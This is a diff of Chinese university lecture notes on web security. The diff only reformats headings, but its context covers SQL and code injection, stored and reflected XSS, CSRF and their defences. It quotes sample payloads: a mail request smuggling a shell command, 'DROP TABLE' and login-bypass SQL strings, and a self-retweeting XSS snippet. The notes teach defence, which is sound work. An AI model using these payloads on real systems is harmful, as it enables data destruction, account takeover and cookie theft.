@@ -1,15 +1,15 @@
-#Web安全：Injection，XSS与CSRF
+# Web安全：Injection，XSS与CSRF
 
-###哈尔滨工业大学 网络与信息安全 张宇 2016
+### 哈尔滨工业大学 网络与信息安全 张宇 2016
 
 ---
 
 本节课程学习针对Web服务器和浏览器的恶意攻击与防御。
 
 
-##1. Web简介
+## 1. Web简介
 
-###1.1 HTTP简介
+### 1.1 HTTP简介
 
 [HTTP（Hypertext Transfer Protocol）](https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol)：一种请求-应答式、无状态、客户端-服务器模式应用层协议，由Tim Berners-Lee在1989年开发，是WWW中数据通信的基础。
 
@@ -98,7 +98,7 @@ Content-type: text/html
 ...followed by document content...
 ```
 
-###1.2 网页简介
+### 1.2 网页简介
 
 - [HTML（HyperText Markup Language）](https://en.wikipedia.org/wiki/HTML)：（内容）结构化文档语言
 - [CSS（Cascading Style Sheets）](https://en.wikipedia.org/wiki/Cascading_Style_Sheets)：（风格）描述文档的表现形式
@@ -107,9 +107,9 @@ Content-type: text/html
 
 ---
 
-##2. Web安全风险分类
+## 2. Web安全风险分类
 
-###2.1 风险分类
+### 2.1 风险分类
 
 - 风险1：恶意网站破坏用户系统
 	- 防御：沙箱化Javascript；避免浏览器bug；特权分离；自动更新等
@@ -133,12 +133,12 @@ Content-type: text/html
 
 ---
 
-##3 注入攻击
+## 3 注入攻击
 
 [SQL注入（SQL Injection）](https://en.wikipedia.org/wiki/SQL_injection)：是一种[代码注入](https://en.wikipedia.org/wiki/Code_injection)技术，恶意SQL语句被插入到一个字段中并被执行。1998年，在黑客杂志[Phrack](https://en.wikipedia.org/wiki/Phrack)上首次披露（[文章链接](http://phrack.org/issues/54/8.html#article)）。
 
 
-###3.0 代码注入
+### 3.0 代码注入
 
 基于`eval`（PHP）的代码注入例子：
 
@@ -166,7 +166,7 @@ http://yourdomain.com/mail.php?
   email=hacker@hackerhome.net & subject="foo < /usr/passwd; ls"
 ```
 
-###3.1 过滤escape字符错误
+### 3.1 过滤escape字符错误
 
 输入中所含特殊字符，未做转意过滤。
 
@@ -196,7 +196,7 @@ a';DROP TABLE users; SELECT * FROM userinfo WHERE 't' = 't'
 SELECT * FROM users WHERE name = 'a';DROP TABLE users; SELECT * FROM userinfo WHERE 't' = 't';
 ```
 
-###3.2 类型处理错误
+### 3.2 类型处理错误
 
 输入字段不是[强类型](https://en.wikipedia.org/wiki/Strong_and_weak_typing)的，或未做类型限制检查。
 
@@ -213,7 +213,7 @@ SELECT * FROM userinfo WHERE id=1; DROP TABLE users;
 ```
 
 
-###3.3 Blind SQL注入
+### 3.3 Blind SQL注入
 
 当实施SQL注入时，注入结果对攻击者是不可见的。
 
@@ -273,7 +273,7 @@ SELECT ssn FROM users WHERE username='XXX’ OR username='JANE'
 ```
 因为并不存在用户`XXX`，转而获得`JANE`的信息。
 
-###3.4 防御
+### 3.4 防御
 
 
 - [参数化语句（parameterized statement）](https://en.wikipedia.org/wiki/Prepared_statement)在语句中使用参数，而不是直接将用户输入嵌入到语句中，令实现可以区分数据和代码。
@@ -302,11 +302,11 @@ $mysqli->query($query);
 - 模式检查（Pattern Check），例如检查整数，浮点数，布尔值参数格式是否正确，一些字符串是否符合特定格式，例如日期等
 - 用特权分离思想限制数据库访问权限，来减小注入攻击危害范围
 
-##4 跨站脚本
+## 4 跨站脚本
 
 [跨站点脚本（Cross-site scripting (XSS)）](https://en.wikipedia.org/wiki/Cross-site_scripting)：攻击者在一个网页中注入恶意客户端脚本，受害者一旦浏览该网页，则其浏览器执行该恶意脚本。也是一种代码注入。
 
-###4.0 同源策略
+### 4.0 同源策略
 
 XSS攻击的一个主要优势是可以绕过[同源策略（same-origin policy）](https://en.wikipedia.org/wiki/Same-origin_policy)，即一个网站的脚本只能访问同一网站资源。
 
@@ -330,7 +330,7 @@ http://www.a.com:80/dir/other.html | Depends | Depends on implementation
 - Stored XSS（持久）：攻击者将脚本注入网站，等待受害者来载入脚本
 - Reflected XSS（非持久）：攻击者让用户点击一个指向恶意脚本的URL，web服务将脚本反射回来
 
-###4.1 存储XSS
+### 4.1 存储XSS
 
 [MySpace Samy蠕虫](http://namb.la/popular/tech.html)：利用XSS在MySpace中注入脚本，令访问MySpace页面的用户与Samy自动加为朋友。Samy成了最后欢迎的人！
 
@@ -350,7 +350,7 @@ action=retweet]').click();alert('XSS in
 Tweetdeck')</script>
 ```
 
-###4.2 反射XSS
+### 4.2 反射XSS
 
 [Google.com UTF-7 XSS漏洞](http://www.securiteam.com/securitynews/6Z00L0AEUE.html)：2005年，两个Google.com上的XSS漏洞允许攻击者来伪装为Google的合法用户或实施一个钓鱼攻击，尽管Google已经采用了防范XSS的机制。
 
@@ -386,7 +386,7 @@ XSS漏洞：当包含有问题URL时，Google会将XSS中常用字符进行转�
 	2. Mallory给Bob网站用户Alice发送电子邮件，包含上述恶意URL链接
 - Alice收到邮件，点击链接，打开Bob网站，在浏览器上载入恶意脚本，盗取了Alice的Cookie
 
-###4.3 防御
+### 4.3 防御
 
 - 对字符串输入进行上下文输出编码/转义：参考[OWASP的XSS防御手册](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet)
 	1. 禁止在未允许的位置插入不可信数据，例如
@@ -403,14 +403,14 @@ XSS漏洞：当包含有问题URL时，Google会将XSS中常用字符进行转�
 - Javascript沙箱
 - [Content Security Policy](https://en.wikipedia.org/wiki/Content_Security_Policy)：显示设置网站资源白名单，例如在HTTP应答头部设置`Content-Security-Policy： default-src ‘self’`，则只允许本站资源
 
-##5. CSRF
+## 5. CSRF
 
 [CSRF（Cross-site request forgery）](https://en.wikipedia.org/wiki/Cross-site_request_forgery)：也称为“one-click attack”，“session riding”或缩写为“XSRF”。恶意站点通过用户的浏览器以用户身份向信赖用户的网站发送请求。
 
 - CSRF与XSS不同之处在于，后者利用用户对特定网站的信任，前者利用网站对用户浏览器的信任
 - CSRF是一种针对Web的糊涂副手问题！
 
-###5.0 Cookie
+### 5.0 Cookie
 
 [HTTP Cookie](https://en.wikipedia.org/wiki/HTTP_cookie)：Web服务器发送给浏览器，并被浏览器存储的一小片数据；在之后请求中携带cookie，在无状态的HTTP之上实现有状态的会话，例如用cookie存储用户登录信息（authentication cookie），存储购物车中商品，存储曾经访问过的网页（tracking cookie）等等
 
@@ -447,7 +447,7 @@ Cookie相关术语和概念：
 	- 当设定Domain属性为"foo.com"时，也包括所有子域，例如"docs.foo.com"（除了IE浏览器）
 	- 当未设定Domain属性时，则只包括"foo.com"
 
-###5.1 一个虚构的盗取资金的例子
+### 5.1 一个虚构的盗取资金的例子
 
 1. 用户登录到bank.com，浏览器获得认证用的cookie
 - 用户访问一个恶意站点www.attacker.com
@@ -476,7 +476,7 @@ www.attacker.com                          Browser                       wwww.ban
      |                                      |<—————————————————————————————————————|
 ```
 
-###5.2 uTorrent CSRF漏洞
+### 5.2 uTorrent CSRF漏洞
  
 - [uTorrent](https://en.wikipedia.org/wiki/ΜTorrent) 是仅次于迅雷的最流行的BT客户端
 - WebUI是一个插件，允许用户从一台计算机的浏览器上通过网络控制另一台计算机上的uTorrent，可通过`localhost:8080 `访问本机上的WebUI服务
@@ -490,7 +490,7 @@ www.attacker.com                          Browser                       wwww.ban
 
 当浏览器访问这些网页时就会自动打开链接，向uTorrent的WebUI发送携带cookie的请求。
 
-###5.3 Login CSRF 
+### 5.3 Login CSRF 
 
 参考资料：[Robust Defenses for Cross-Site Request Forgery (ACM CCS 2008)](http://www.adambarth.com/papers/2008/barth-jackson-mitchell-b.pdf)
 
@@ -505,7 +505,7 @@ www.attacker.com                          Browser                       wwww.ban
 	- 但攻击者并不访问，而是令用户的浏览器来访问`return_to` URL
 	- RP完成OpenID协议，在用户的浏览器中存储会话cookie，用户已经作为攻击者登录了RP
 
-###5.4 防御
+### 5.4 防御
 
 - Secret Validation Token：由服务器生成一个随机token发送给浏览器，后续请求需携带token；没有该token的伪造请求不能得到应答
 	- Token必须保证不能为预测或伪造，例如令Token=MAC(server-key, session-ID)
